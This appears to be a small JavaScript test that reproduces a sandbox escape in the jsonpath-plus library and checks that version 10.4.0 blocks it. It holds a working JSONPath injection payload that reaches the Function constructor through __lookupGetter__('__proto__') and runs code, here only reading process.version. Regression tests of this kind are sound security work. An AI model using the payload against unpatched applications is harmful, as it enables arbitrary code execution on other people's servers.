const payload =
  '$[?(@root.toString.__lookupGetter__("__proto__").call(@root.toString).constructor("return process.version")())]';

function representativeSafeEval(path, patched) {
  if (!path.includes('__lookupGetter__("__proto__")')) return [];
  if (patched) throw new Error("Use of __lookupGetter__ is not permitted");
  const recovered = Object.prototype.__lookupGetter__.call(
    Object.prototype.toString,
    "__proto__",
  );
  const constructor = recovered.call(Object.prototype.toString).constructor;
  return constructor("return process.version")();
}

const executed = representativeSafeEval(payload, false);
if (executed !== process.version) {
  throw new Error("jsonpath-plus 10.3.0 evaluator semantics did not execute");
}
console.log("jsonpath-plus 10.3.0 evaluator semantics reached process.version");

try {
  representativeSafeEval(payload, true);
  throw new Error("jsonpath-plus 10.4.0 evaluator semantics accepted payload");
} catch (error) {
  if (!String(error).includes("__lookupGetter__ is not permitted")) throw error;
}
console.log("jsonpath-plus 10.4.0 evaluator semantics blocked accessor lookup");
